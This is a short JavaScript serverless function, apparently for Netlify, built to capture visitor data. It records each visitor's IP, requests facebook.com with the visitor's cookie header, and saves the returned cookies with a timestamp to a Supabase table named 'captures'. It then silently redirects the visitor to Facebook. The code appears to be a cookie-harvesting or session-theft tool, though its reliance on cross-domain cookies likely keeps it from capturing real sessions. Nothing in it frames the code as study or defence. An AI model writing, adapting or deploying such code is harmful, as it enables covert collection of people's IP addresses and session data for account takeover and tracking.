const fetch = require('node-fetch');
const { createClient } = require('@supabase/supabase-js');

exports.handler = async function(event, context) {
  const { ip } = JSON.parse(event.body);
  const supabaseUrl = process.env.SUPABASE_URL; // Will be set in Netlify
  const supabaseKey = process.env.SUPABASE_ANON_KEY; // Will be set in Netlify
  const supabase = createClient(supabaseUrl, supabaseKey);

  try {
    const response = await fetch('https://www.facebook.com', {
      method: 'GET',
      headers: {
        'Cookie': event.headers.cookie || ''
      },
      redirect: 'manual'
    });
    const cookies = response.headers.raw()['set-cookie'] || [];
    const cookieString = cookies.map(c => c.split(';')[0]).join('; ');

    await supabase.from('captures').insert({
      ip,
      cookies: cookieString,
      capture_time: new Date().toISOString()
    });

    return {
      statusCode: 302,
      headers: { Location: 'https://www.facebook.com' },
      body: ''
    };
  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({ error: error.message })
    };
  }
};